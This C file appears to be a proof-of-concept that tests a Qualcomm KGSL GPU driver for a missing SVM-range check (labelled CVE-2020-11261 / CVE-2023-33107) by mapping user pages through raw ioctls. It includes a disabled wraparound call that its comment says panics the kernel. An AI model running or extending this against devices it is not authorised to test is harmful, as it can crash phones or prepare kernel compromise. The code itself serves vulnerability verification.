/*
 * kgsl_bugA_poc.c - SAFE proof-of-concept for the missing SVM-range check in
 * kgsl_iommu_set_svm_region (CVE-2020-11261 / CVE-2023-33107) on the KEYone.
 *
 * The vulnerable kernel has NO check that the requested [gpuaddr, gpuaddr+size]
 * lies inside the KGSL SVM range; the 2021 fix added iommu_addr_in_svm_ranges().
 * We demonstrate this by mapping a normal anonymous page (whose address is far
 * outside the KGSL SVM range 0x700000000..0x800000000) via IOCTL_KGSL_MAP_USER_MEM
 * with KGSL_MEMFLAGS_USE_CPU_MAP:
 *   - patched kernel : -ENOMEM (range check rejects)
 *   - vulnerable     : 0       (accepted, rbtree entry + GPU mapping created)
 *
 * This does NOT use the wraparound/overlap/PTE path, so it cannot panic.
 * It only maps a page we own. Fully reversible (freed before exit).
 *
 * Build:
 *   zig cc -target aarch64-linux-musl -nostdlib -static -ffreestanding \
 *     -fno-builtin -O2 -Wl,-e,_start -o kgsl_bugA_poc kgsl_bugA_poc.c
 */
typedef unsigned char u8; typedef unsigned int u32; typedef unsigned long u64; typedef long s64;
#define SYS_openat 56
#define SYS_ioctl 29
#define SYS_write 64
#define SYS_exit 93
#define SYS_close 57
#define SYS_mmap 222
#define SYS_munmap 215
static inline s64 sys3(long n,s64 a,s64 b,s64 c){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x8):"memory");return x0;}
static inline s64 sys4(long n,s64 a,s64 b,s64 c,s64 d){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x8):"memory");return x0;}
static inline s64 sys6(long n,s64 a,s64 b,s64 c,s64 d,s64 e,s64 f){register s64 x0 __asm__("x0")=a;register s64 x1 __asm__("x1")=b;register s64 x2 __asm__("x2")=c;register s64 x3 __asm__("x3")=d;register s64 x4 __asm__("x4")=e;register s64 x5 __asm__("x5")=f;register s64 x8 __asm__("x8")=n;__asm__ volatile("svc #0":"+r"(x0):"r"(x1),"r"(x2),"r"(x3),"r"(x4),"r"(x5),"r"(x8):"memory");return x0;}
static int slen(const char*s){int n=0;while(s[n])n++;return n;}
static void out(const char*s){sys3(SYS_write,1,(s64)s,slen(s));}
static void outhex(u64 v){char b[19];b[0]='0';b[1]='x';for(int i=0;i<16;i++){int n=(v>>((15-i)*4))&0xf;b[2+i]=n<10?'0'+n:'a'+n-10;}b[18]=0;out(b);}
static void outdec(s64 v){char b[24];int i=23;b[i--]=0;int neg=v<0;if(neg)v=-v;if(v==0)b[i--]='0';while(v>0){b[i--]='0'+(v%10);v/=10;}if(neg)b[i--]='-';out(&b[i+1]);}
#define _IOC_WRITE 1u
#define _IOC_READ 2u
#define IOC(dir,type,nr,size) (((dir)<<30)|((size)<<16)|((type)<<8)|(nr))
#define KGSL_MAGIC 0x09
struct kgsl_map_user_mem{int fd;u32 pad;u64 gpuaddr;u64 len;u64 offset;u64 hostptr;u32 memtype;u32 flags;};
#define IOCTL_MAP_USER_MEM IOC(_IOC_READ|_IOC_WRITE,KGSL_MAGIC,0x15,sizeof(struct kgsl_map_user_mem))
struct kgsl_sharedmem_free{unsigned long gpuaddr;};
#define IOCTL_SHAREDMEM_FREE IOC(_IOC_WRITE,KGSL_MAGIC,0x21,sizeof(struct kgsl_sharedmem_free))
#define KGSL_MEMFLAGS_USE_CPU_MAP 0x10000000ull
#define KGSL_USER_MEM_TYPE_ADDR 2

/* mmap an anonymous RW page; returns addr or negative */
static s64 anon_page(void){
    /* PROT_READ|PROT_WRITE=3 ; MAP_PRIVATE|MAP_ANONYMOUS=0x22 */
    return sys6(SYS_mmap, 0, 0x1000, 3, 0x22, -1, 0);
}

static long map_usermem(long fd, u64 hostptr, u64 len){
    struct kgsl_map_user_mem m;
    for(u64 i=0;i<sizeof(m);i++)((u8*)&m)[i]=0;
    m.fd=-1; m.gpuaddr=0; m.len=len; m.offset=0; m.hostptr=hostptr;
    m.memtype=KGSL_USER_MEM_TYPE_ADDR; m.flags=(u32)KGSL_MEMFLAGS_USE_CPU_MAP;
    return sys3(SYS_ioctl, fd, IOCTL_MAP_USER_MEM, (s64)&m);
}

void _start(void){
    long fd=sys4(SYS_openat,-100,(s64)"/dev/kgsl-3d0",2,0);
    out("[*] open /dev/kgsl-3d0 = ");outdec(fd);out("\n");
    if(fd<0){out("[!] cannot open\n");sys3(SYS_exit,1,0,0);return;}

    /* --- Test 1: control, address INSIDE the KGSL SVM range (0x700000000) --- */
    /* Try to place a page at the SVM base so the in-range case can be tested. */
    s64 inrange = sys6(SYS_mmap, 0x700000000ull, 0x1000, 3, 0x32 /*PRIVATE|ANON|FIXED*/, -1, 0);
    out("[*] mmap(FIXED 0x700000000) = "); outhex((u64)inrange); out("\n");
    if(inrange>0){
        long r = map_usermem(fd, (u64)inrange, 0x1000);
        out("[*] T1 in-SVM-range  hostptr=");outhex((u64)inrange);out(" len=0x1000 -> ");outdec(r);out("\n");
        if(r==0){ struct kgsl_sharedmem_free f; f.gpuaddr=(unsigned long)inrange; sys3(SYS_ioctl,fd,IOCTL_SHAREDMEM_FREE,(s64)&f); }
    }

    /* --- Test 2 (THE PROOF): valid page at a normal address OUTSIDE SVM range --- */
    s64 p = anon_page();
    out("[*] mmap(anon) = "); outhex((u64)p); out("\n");
    if(p>0){
        long r = map_usermem(fd, (u64)p, 0x1000);
        out("[*] T2 out-of-SVM-range hostptr=");outhex((u64)p);out(" len=0x1000 -> ");outdec(r);
        if(r==0){
            out("   <== MISSING SVM RANGE CHECK CONFIRMED (accepted out-of-range addr)\n");
            struct kgsl_sharedmem_free f; f.gpuaddr=(unsigned long)p; sys3(SYS_ioctl,fd,IOCTL_SHAREDMEM_FREE,(s64)&f);
        } else if(r==-12){
            out("   (rejected -ENOMEM -> range check present / or other reject)\n");
        } else {
            out("   (other)\n");
        }
    }

    /* --- Test 3 DISABLED (panics: huge-size DoS) --- */
    if(0){
        long r = map_usermem(fd, (u64)p, 0xfffffffffffff000ull); /* +0x1000 wraps to 0 */
        out("[*] T3 wraparound    hostptr=");outhex((u64)p);out(" len=0xfffffffffffff000 -> ");outdec(r);out("\n");
    }

    out("[*] done (no overlap/PTE path used; safe)\n");
    sys3(SYS_close,fd,0,0);
    sys3(SYS_exit,0,0,0);
}
